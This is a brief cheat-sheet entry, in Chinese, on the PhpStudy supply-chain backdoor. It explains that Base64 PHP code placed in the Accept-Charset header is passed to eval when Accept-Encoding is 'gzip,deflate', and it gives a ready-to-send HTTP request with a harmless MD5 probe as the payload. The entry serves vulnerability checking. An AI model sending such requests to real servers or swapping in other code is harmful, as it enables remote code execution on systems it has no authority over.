# PHP

## PhpStudy

- **PhpStudy 后门供应链**

后门代码会判断HTTP头的Accept-Encoding字段是否为”gzip,deflate “，如果是就执行这个流程，从Accept-Charset取出来的内容经过Base64解密后，然后eval执行

```http
GET / HTTP/1.1
Accept-Encoding: gzip,deflate
Accept-Charset: ZGllKG1kNSgnSGVsbG9waHBTdHVkeScpKTs=
```

